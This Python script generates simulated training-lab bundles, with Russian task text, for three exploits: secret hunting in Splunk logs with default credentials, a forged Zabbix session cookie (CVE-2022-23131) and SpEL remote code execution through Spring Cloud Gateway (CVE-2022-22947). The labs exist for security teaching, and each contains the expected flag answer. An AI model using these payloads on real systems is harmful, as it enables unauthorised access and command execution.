#!/usr/bin/env python3
"""Write lab bundles for S9 lessons (splunk/zabbix/spring-cloud-gateway)."""
import base64
import json
import os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LABS = os.path.join(ROOT, 'content', 'labs')
WD = '/home/student/task'

def write(b):
    with open(os.path.join(LABS, b['id'] + '.json'), 'w', encoding='utf-8') as f:
        json.dump(b, f, ensure_ascii=False, indent=2)
        f.write('\n')

# forged zbx_session cookie
zabbix_cookie = base64.b64encode(json.dumps(
    {"sessionid": "0000000000000000", "sign": "forged",
     "saml_data": {"username_attribute": "Admin"}}).encode()).decode()

write({
    'id': 'web-splunk', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{splunk_l0gs_l34k_t0k3ns_4nd_p4ssw0rds}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: секреты в логах Splunk\n\n"
            "Цель: `http://splunk.local:8000` (API на `:8089`).\n\n"
            "1. Определи версию (дефолтные креды admin/changeme):\n"
            "   curl -s -k -u admin:changeme https://splunk.local:8089/services/server/info\n\n"
            "2. Выполни поиск по шаблону (ищем токены и пароли в логах):\n"
            "   curl -s -k -u admin:changeme -X POST "
            "'https://splunk.local:8089/services/search/jobs/export' "
            "-d 'search=index=* | regex password|token' -d 'output_mode=json'\n\n"
            "3. В результатах — строка с флагом. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция splunk.local)', 'cases': [
        {'match': 'search/jobs/export|regex|output_mode',
         'example': "-s -k -u admin:changeme -X POST '.../search/jobs/export' -d 'search=index=* | regex password|token'",
         'output': ('{"result":{"_raw":"POST /api/pay Authorization: Bearer eyJhbGciOi..."}}\n'
                    '{"result":{"_raw":"db conn string postgres://app:Pr0dDBpass@db.internal"}}\n'
                    '{"result":{"_raw":"nto{splunk_l0gs_l34k_t0k3ns_4nd_p4ssw0rds}"}}\n')},
        {'match': 'server/info',
         'example': '-s -k -u admin:changeme https://splunk.local:8089/services/server/info',
         'output': '<s:key name="version">9.0.4</s:key>\n'},
        {'match': 'splunk\\.local:8000|account/login',
         'example': '-s -k http://splunk.local:8000/en-US/account/login',
         'output': '<html><head><title>Splunk</title></head><body>Sign in</body></html>\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только splunk.local'}},
})

write({
    'id': 'web-zabbix', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{z4bb1x_s4ml_byp4ss_zbx_s3ss10n}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Zabbix CVE-2022-23131 (обход SAML)\n\n"
            "Цель: `http://zabbix.local:8080`.\n\n"
            "1. Версия (открытый метод):\n"
            "   curl -s -H 'Content-Type: application/json' "
            "-d '{\"jsonrpc\":\"2.0\",\"method\":\"apiinfo.version\",\"params\":{},\"id\":1}' "
            "http://zabbix.local:8080/api_jsonrpc.php\n\n"
            "2. Cookie сессии не проверяется по подписи. Подделанная cookie (base64 JSON):\n"
            "   zbx_session=" + zabbix_cookie + "\n\n"
            "3. Отправь запрос с подделанной cookie:\n"
            "   curl -s 'http://zabbix.local:8080/zabbix.php?action=dashboard.view' "
            "-H 'Cookie: zbx_session=" + zabbix_cookie + "'\n\n"
            "4. В ответе — флаг. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция zabbix.local)', 'cases': [
        {'match': 'zbx_session|dashboard',
         'example': "-s 'http://zabbix.local:8080/zabbix.php?action=dashboard.view' -H 'Cookie: zbx_session=...'",
         'output': '<html><body>Zabbix Dashboard (Admin)\nnto{z4bb1x_s4ml_byp4ss_zbx_s3ss10n}\n</body></html>\n'},
        {'match': 'apiinfo\\.version',
         'example': "-s -H 'Content-Type: application/json' -d '{...apiinfo.version...}' http://zabbix.local:8080/api_jsonrpc.php",
         'output': '{"jsonrpc":"2.0","result":"5.4.0","id":1}\n'},
        {'match': 'user\\.login',
         'example': "-s -d '{...user.login Admin/zabbix...}' http://zabbix.local:8080/api_jsonrpc.php",
         'output': '{"jsonrpc":"2.0","result":"<session-token>","id":1}\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только zabbix.local'}},
})

write({
    'id': 'web-spring-cloud-gateway', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{spring_g4t3w4y_sp3l_4ct1v4t0r_rce}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Spring Cloud Gateway CVE-2022-22947\n\n"
            "Цель: `http://gateway.local:8080`.\n\n"
            "1. Actuator открыт — посмотри ссылки:\n"
            "   curl -s http://gateway.local:8080/actuator\n\n"
            "2. Создай маршрут со SpEL-фильтром (payload в route.json):\n"
            "   curl -s -X POST http://gateway.local:8080/actuator/gateway/routes/hack "
            "-H 'Content-Type: application/json' --data-binary @route.json\n\n"
            "3. Активируй маршрут:\n"
            "   curl -s -X POST http://gateway.local:8080/actuator/gateway/refresh\n\n"
            "4. Обратись к маршруту — в заголовке Result вывод команды с флагом:\n"
            "   curl -s -D - http://gateway.local:8080/hack -o /dev/null\n\n"
            "5. Сохрани флаг в found.txt и набери `check`.\n"
        )},
        {'path': WD + '/route.json', 'text': (
            '{"id":"hack","filters":[{"name":"AddResponseHeader","args":{"name":"Result",'
            '"value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"})'
            '.getInputStream().readAllBytes())}"}}],"uri":"http://example.com",'
            '"predicates":[{"name":"Path","args":{"_genkey_0":"/hack"}}]}\n'
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция gateway.local)', 'cases': [
        {'match': 'gateway/refresh',
         'example': '-s -X POST http://gateway.local:8080/actuator/gateway/refresh',
         'output': '{"refreshed":["hack"]}\n'},
        {'match': 'routes/hack|route\\.json|AddResponseHeader',
         'example': '-s -X POST http://gateway.local:8080/actuator/gateway/routes/hack --data-binary @route.json',
         'output': '201 Created\n'},
        {'match': '/hack',
         'example': '-s -D - http://gateway.local:8080/hack -o /dev/null',
         'output': ('HTTP/1.1 200 OK\nResult: uid=0(root) gid=0(root) groups=0(root) '
                    'nto{spring_g4t3w4y_sp3l_4ct1v4t0r_rce}\n\n')},
        {'match': 'actuator',
         'example': '-s http://gateway.local:8080/actuator',
         'output': '{"_links":{"self":{"href":"http://gateway.local:8080/actuator"},'
                   '"gateway":{"href":"http://gateway.local:8080/actuator/gateway"},'
                   '"env":{"href":"http://gateway.local:8080/actuator/env"}}}\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только gateway.local'}},
})

print('s9 lab bundles written')
